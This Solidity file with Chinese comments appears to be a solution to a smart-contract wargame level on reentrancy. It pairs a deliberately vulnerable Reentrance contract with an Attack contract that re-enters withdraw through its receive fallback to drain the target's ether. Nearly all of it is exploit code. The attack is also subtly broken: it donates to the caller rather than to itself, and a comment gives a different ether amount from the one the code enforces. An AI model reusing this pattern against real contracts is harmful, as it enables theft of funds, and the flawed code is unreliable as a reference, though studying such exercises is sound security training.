// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import 'openzeppelin-contracts-06/math/SafeMath.sol';
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/math/SafeMath.sol";

/**
 * 这一关的目标是偷走合约的所有资产.
 *
 * 不可信的合约可以在你意料之外的地方执行代码.
 * Fallback methods
 * 抛出/恢复 bubbling
 * 有的时候攻击一个合约的最好方式是使用另一个合约.
 *
 * 解题思路：来自S01. 重入攻击
 *
 */
contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attack {
    Reentrance public reentrance;

    event LOG(uint256 balance);

    // 初始化Bank合约地址
    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
    }
    
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        emit LOG(address(reentrance).balance);
        if (address(reentrance).balance >= 500000000000000 wei) {
            reentrance.withdraw(500000000000000);
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 500000000000000 wei, "Require 500000000000000 wei to attack");
        reentrance.donate{value: 500000000000000 wei}(msg.sender);
        reentrance.withdraw(500000000000000);
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
